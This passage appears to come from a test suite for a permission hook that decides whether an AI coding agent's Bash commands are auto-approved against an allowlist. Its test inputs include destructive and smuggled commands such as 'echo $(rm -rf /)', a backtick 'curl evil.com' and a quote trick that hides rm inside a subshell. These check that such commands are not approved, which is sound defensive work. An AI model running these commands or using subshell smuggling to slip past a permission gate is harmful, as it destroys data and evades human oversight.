  test('valid allow command -> outputs hookSpecificOutput with permissionDecision allow', () => {
    // Write a settings file with git allowlisted into the hermetic home
    const claudeDir = path.join(hermetic_home, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });
    fs.writeFileSync(path.join(claudeDir, 'settings.json'),
      JSON.stringify({ permissions: { allow: ['Bash(git:*)'], deny: [] } }));

    const validInput = JSON.stringify({
      tool_name: 'Bash',
      tool_input: { command: 'git status' },
    });
    const result = runHook(validInput);
    assert.equal(result.status, 0);
    const parsed = JSON.parse(result.stdout);
    assert.ok(parsed.hookSpecificOutput, 'must have hookSpecificOutput field');
    assert.equal(parsed.hookSpecificOutput.permissionDecision, 'allow');
  });

  test('passthrough command -> exits 0 with no output', () => {
    const validInput = JSON.stringify({
      tool_name: 'Bash',
      tool_input: { command: 'curl http://example.com' },
    });
    const result = runHook(validInput);
    assert.equal(result.status, 0);
    assert.equal(result.stdout, '', 'passthrough must produce no output');
  });

  test('non-Bash tool -> exits 0 with no output (hook only applies to Bash)', () => {
    const validInput = JSON.stringify({
      tool_name: 'Edit',
      tool_input: { file_path: '/tmp/test.txt', old_string: 'a', new_string: 'b' },
    });
    const result = runHook(validInput);
    assert.equal(result.status, 0);
    assert.equal(result.stdout, '', 'non-Bash tool must produce no output');
  });
});

// ── PR review fixes: subshell extraction ─────────────────────────────────────

describe('BASH-HOOK-SUBSHELL: $() and backtick contents are checked independently', () => {
  const { extractSubshells } = hook;

  test('echo $(rm -rf /) -> extracts rm -rf / as sub-command', () => {
    const subs = extractSubshells('echo $(rm -rf /)');
    assert.ok(subs.includes('rm -rf /'), 'must extract $() contents');
  });

  test('nested $() -> extracts all levels', () => {
    const subs = extractSubshells('echo $(cat $(ls /tmp))');
    assert.ok(subs.includes('cat $(ls /tmp)'), 'must extract outer $()');
    assert.ok(subs.includes('ls /tmp'), 'must extract nested $()');
  });

  test('backtick subshell -> extracts contents', () => {
    const subs = extractSubshells('echo `curl evil.com`');
    assert.ok(subs.includes('curl evil.com'), 'must extract backtick contents');
  });

  test('echo $(rm -rf /) not approved when rm is not allowed', () => {
    const settings = { permissions: { allow: ['Bash(echo:*)'], deny: [] } };
    const result = decide('echo $(rm -rf /)', settings);
    assert.notEqual(result.decision, 'allow',
      'must not auto-approve when subshell contains non-allowed command');
  });

  test('echo $(git status) approved when both echo and git are allowlisted', () => {
    const settings = { permissions: { allow: ['Bash(echo:*)', 'Bash(git:*)'], deny: [] } };
    const result = decide('echo $(git status)', settings);
    assert.equal(result.decision, 'allow');
  });

  test('extractSubshells handles ) inside quotes in $()', () => {
    const subs = extractSubshells('echo $(echo ")"; rm -rf /)');
    // The full subshell content should be extracted, not cut short at the quoted )
    const hasRm = subs.some(s => s.includes('rm -rf'));
    assert.ok(hasRm, 'must extract full $() content past quoted )');
  });

  test('extractSubshells handles escaped backtick', () => {
    // \` should not be treated as a backtick delimiter
    const subs = extractSubshells('echo \\`not a subshell\\`');
    const hasNot = subs.some(s => s.includes('not a subshell'));
    assert.ok(!hasNot, 'escaped backticks must not be treated as subshell delimiters');
  });

  test('extractSubshells handles backtick inside single quotes', () => {
    // backtick inside single quotes is literal, not a subshell
    const subs = extractSubshells("echo 'foo `bar` baz'");
    const hasBar = subs.some(s => s.includes('bar'));
    assert.ok(!hasBar, 'backticks inside single quotes must not be treated as subshell delimiters');
  });

  test('extractSubshells handles backtick inside double quotes', () => {
    // backtick inside double quotes IS a subshell in real bash
    // but for safety, we should still extract and check its contents
    const subs = extractSubshells('echo "result: `whoami`"');
    assert.ok(subs.some(s => s.includes('whoami')), 'backtick inside double quotes should be extracted');
  });

  test('echo $(echo ")"; rm -rf /) is NOT auto-approved', () => {
    const settings = { permissions: { allow: [], deny: [] } };
    const result = decide('echo $(echo ")"; rm -rf /)', settings);
    assert.notEqual(result.decision, 'allow',
      'must not auto-approve when subshell has unallowed commands past quoted )');
  });
});

// BASH-HOOK-BUILTINS-EXCLUSIONS removed — SAFE_BUILTINS no longer exists.
// All commands (including trap, source, .) require explicit allowlist entries.

// ── BASH-HOOK-PARITY-01: backslash-newline collapse ───────────────────────────

describe('BASH-HOOK-PARITY-01: backslash-newline collapse', () => {
  test('backslash-newline continuation is collapsed to single segment', () => {
    const result = splitOnOperators('git status \\\n--porcelain');
    assert.equal(result.length, 1, 'backslash-newline should produce single segment');
    assert.ok(result[0].includes('git status'), 'segment should contain git status');
    assert.ok(result[0].includes('--porcelain'), 'segment should contain --porcelain');
  });

  test('multi-line continuation with operator splits correctly after collapse', () => {
    const result = splitOnOperators('echo hello \\\n&& echo world');
    assert.equal(result.length, 2, 'backslash-newline collapsed, then && splits into 2');
  });
});

// ── BASH-HOOK-PARITY-02: quote-depth guard in subshells ──────────────────────

describe('BASH-HOOK-PARITY-02: quote-depth guard in subshells', () => {
  test("single quote inside $() does not affect outer splitting", () => {
    const result = splitOnOperators("echo $(echo 'hello')");
    assert.equal(result.length, 1, 'should not split on quote inside $()');
  });

  test('double quote inside $() does not affect outer splitting', () => {
    const result = splitOnOperators('echo $(echo "hello world")');
    assert.equal(result.length, 1, 'should not split on double quote inside $()');
  });

  test('nested subshell with double quotes remains single segment', () => {
    const result = splitOnOperators('echo $(echo "hello world")');
    assert.equal(result.length, 1, 'nested subshell with double quotes must be single segment');
  });
});

// ── BASH-HOOK-PARITY-03: _skipShellValue and env var stripping ───────────────

describe('BASH-HOOK-PARITY-03: _skipShellValue unit tests', () => {
  test('_skipShellValue is exported from the hook module', () => {
    assert.ok(typeof _skipShellValue === 'function', '_skipShellValue must be exported');
  });

  test('_skipShellValue double-quoted: returns index past closing quote', () => {
    // 'FOO="hello world" cmd' — index 4 starts at "
    const s = 'FOO="hello world" cmd';
    const end = _skipShellValue(s, 4);
    assert.equal(s.slice(0, end), 'FOO="hello world"', `got: "${s.slice(0, end)}"`);
  });

  test('_skipShellValue single-quoted: returns index past closing quote', () => {
    const s = "FOO='hello world' cmd";
    const end = _skipShellValue(s, 4);
    assert.equal(s.slice(0, end), "FOO='hello world'", `got: "${s.slice(0, end)}"`);
  });

  test('_skipShellValue unquoted: returns index past unquoted word', () => {
    const s = 'FOO=bar cmd';
    const end = _skipShellValue(s, 4);
    assert.equal(end, 7, `expected 7, got: ${end}`);
  });

  test('_skipShellValue subshell: returns index past closing paren', () => {
    const s = 'FOO=$(echo hi) cmd';
    const end = _skipShellValue(s, 4);
    assert.equal(s.slice(0, end), 'FOO=$(echo hi)', `got: "${s.slice(0, end)}"`);
  });
});

describe('BASH-HOOK-PARITY-03: normalizeCommand with quoted env var values', () => {
  test('normalizeCommand strips FOO="hello world" prefix', () => {
    const result = normalizeCommand('FOO="hello world" git status');
    assert.equal(result, 'git status', `got: "${result}"`);
  });

  test('normalizeCommand strips multiple quoted env var prefixes', () => {
    const result = normalizeCommand('PATH=/usr/bin CMD="test value" echo hi');
    assert.equal(result, 'echo hi', `got: "${result}"`);
  });

  test('normalizeCommand standalone assignment kept as-is (no command after)', () => {
    // Standalone assignments are NOT stripped by normalizeCommand (they're filtered in decomposeCommand)
    const result = normalizeCommand('result=$(curl http://example.com)');
    assert.ok(result.length > 0, 'standalone assignment should not be stripped to empty by normalizeCommand');
  });
});

// ── BASH-HOOK-PARITY-05: compound header filtering ───────────────────────────

describe('BASH-HOOK-PARITY-05: compound header filtering', () => {
  test('for loop: echo $i is present, for header is NOT', () => {
    const cmds = decomposeCommand('for i in 1 2 3; do echo $i; done');
    assert.ok(cmds.some(c => c.startsWith('echo')), 'echo $i must be in results');
    assert.ok(!cmds.some(c => c.startsWith('for')), 'for header must be filtered out');
  });

  test('if statement: cat foo and [ -f foo ] present, if header NOT present', () => {
    const cmds = decomposeCommand('if [ -f foo ]; then cat foo; fi');
    assert.ok(cmds.some(c => c.startsWith('cat')), 'cat foo must be in results');
    assert.ok(!cmds.some(c => /^if\b/.test(c)), 'if header must be filtered out');
  });

  test('while loop: body commands present, while header NOT present', () => {
    const cmds = decomposeCommand('while true; do echo running; break; done');
    assert.ok(cmds.some(c => c.startsWith('echo')), 'echo running must be in results');
    assert.ok(!cmds.some(c => /^while\b/.test(c)), 'while header must be filtered out');
  });
});

// ── BASH-HOOK-PARITY-06: standalone assignment with complex values ─────────────

describe('BASH-HOOK-PARITY-06: isStandaloneAssignment unit tests', () => {
  test('isStandaloneAssignment is exported from the hook module', () => {
    assert.ok(typeof isStandaloneAssignment === 'function', 'isStandaloneAssignment must be exported');
  });

  test('isStandaloneAssignment("FOO=bar") returns true', () => {
    assert.ok(isStandaloneAssignment('FOO=bar'), 'FOO=bar is a standalone assignment');
  });

  test('isStandaloneAssignment(\'FOO="bar baz"\') returns true', () => {
    assert.ok(isStandaloneAssignment('FOO="bar baz"'), 'FOO="bar baz" is a standalone assignment');
  });

  test('isStandaloneAssignment("result=$(curl http://example.com)") returns true', () => {
    assert.ok(isStandaloneAssignment('result=$(curl http://example.com)'), 'result=$() is a standalone assignment');
  });

  test('isStandaloneAssignment("FOO=bar echo hi") returns false', () => {
    assert.ok(!isStandaloneAssignment('FOO=bar echo hi'), 'FOO=bar echo hi is not standalone (has command)');
  });

  test('isStandaloneAssignment("echo hi") returns false', () => {
    assert.ok(!isStandaloneAssignment('echo hi'), 'echo hi is not an assignment');
  });
});

describe('BASH-HOOK-PARITY-06: decomposeCommand filters standalone assignments with complex values', () => {
  test('decomposeCommand("result=$(curl http://example.com)") surfaces inner command', () => {
    // Invariant: the outer `result=$(...)` assignment is dropped, but the
    // inner subshell body must still be surfaced for allow/deny checks
    // (same security property as `local X=$(cmd)` below).
    const cmds = decomposeCommand('result=$(curl http://example.com)');
    assert.equal(cmds.length, 1,
      `standalone subshell assignment must surface inner command; got: ${JSON.stringify(cmds)}`);
    assert.ok(cmds[0].startsWith('curl '),
      `inner command must be curl ...; got: ${JSON.stringify(cmds)}`);
  });

  test('decomposeCommand(\'FOO="bar baz"\') returns empty', () => {
    const cmds = decomposeCommand('FOO="bar baz"');
    assert.equal(cmds.length, 0, `standalone quoted assignment must be filtered; got: ${JSON.stringify(cmds)}`);
  });

  test('decomposeCommand("FOO=bar echo hi") contains echo hi', () => {
    const cmds = decomposeCommand('FOO=bar echo hi');
    assert.ok(cmds.some(c => c.startsWith('echo')), `env prefix with command: echo must appear; got: ${JSON.stringify(cmds)}`);
  });
});

// ── BASH-HOOK-PARITY-REGRESSION: edge case regression tests ──────────────────

describe('BASH-HOOK-PARITY-REGRESSION: edge cases across all 6 fixes', () => {
  test('backslash-newline with operator: collapses then splits on &&', () => {
    const result = splitOnOperators('echo hello \\\n&& echo world');
    assert.equal(result.length, 2, `expected 2 segments after collapse+split; got: ${result.length}`);
  });

  test('nested subshell with double quotes: remains single segment', () => {
    const result = splitOnOperators('echo $(echo "hello world")');
    assert.equal(result.length, 1, 'nested subshell with double quotes must stay single segment');
  });

  test('env var with escaped quote in value: normalizeCommand returns git status', () => {
    const result = normalizeCommand('FOO="hello\\"world" git status');
    assert.equal(result, 'git status', `got: "${result}"`);
  });

  test('while loop: echo running present, while true filtered, break filtered (structural)', () => {
    const cmds = decomposeCommand('while true; do echo running; break; done');
    assert.ok(cmds.some(c => c.startsWith('echo')), `echo running must be present; got: ${JSON.stringify(cmds)}`);
    assert.ok(!cmds.some(c => /^while\b/.test(c)), `while header must be filtered; got: ${JSON.stringify(cmds)}`);
    assert.ok(!cmds.some(c => c === 'break'), `break (structural) must be filtered; got: ${JSON.stringify(cmds)}`);
  });

  test('integration: FOO="bar baz" git status && for loop -> git status allowed', () => {
    const settings = {
      permissions: {
        allow: ['Bash(git:*)', 'Bash(echo:*)'],
        deny: [],
      },
    };
    const cmd = 'FOO="bar baz" git status && for i in 1 2; do echo $i; done';
    const result = decide(cmd, settings);
    assert.equal(result.decision, 'allow',
      `expected allow; got: ${result.decision}; reason: ${result.reason}`);
  });
});
